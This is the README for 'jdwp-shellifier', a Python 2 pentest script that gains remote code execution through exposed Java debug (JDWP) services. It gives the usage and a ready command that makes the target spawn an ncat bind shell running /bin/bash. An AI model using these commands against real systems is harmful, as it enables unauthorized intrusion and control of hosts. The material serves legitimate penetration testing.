# JDWP exploitation script

## What is it ?
This exploitation script is meant to be used by pentesters against active JDWP service, in order to gain Remote Code Execution.

## How does it work ?
Well, in a pretty standard way, the script only requires a Python 2 interpreter:

	% python ./jdwp-shellifier.py -h
	usage: jdwp-shellifier.py [-h] -t IP [-p PORT] [--break-on JAVA_METHOD]
                          [--cmd COMMAND]

    Universal exploitation script for JDWP by @_hugsy_

    optional arguments:
    -h, --help            show this help message and exit
    -t IP, --target IP    Remote target IP (default: None)
    -p PORT, --port PORT  Remote target port (default: 8000)
    --break-on JAVA_METHOD
    Specify full path to method to break on (default:
    	java.net.ServerSocket.accept)
    	--cmd COMMAND         Specify full path to method to break on (default:
    		None)

To target a specific host/port:

	$ python ./jdwp-shellifier.py -t my.target.ip -p 1234
	
This command will only inject Java code on the JVM and show some info like Operating System, Java version. Since it does not execute external code/binary, it is totally safe and can be used as Proof-Of-Concept

	$ python ./jdwp-shellifier.py -t my.target.ip -p 1234 --cmd "ncat -v -l -p 1234 -e /bin/bash"
	
This command will actually execute the process `ncat` with the specified argument with the rights given to the running JVM.

Before sending questions, make sure to read http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html for full understanding of the JDWP protocol. 

## Thanks
* Ilja Van Sprundel
* Sebastien Macke





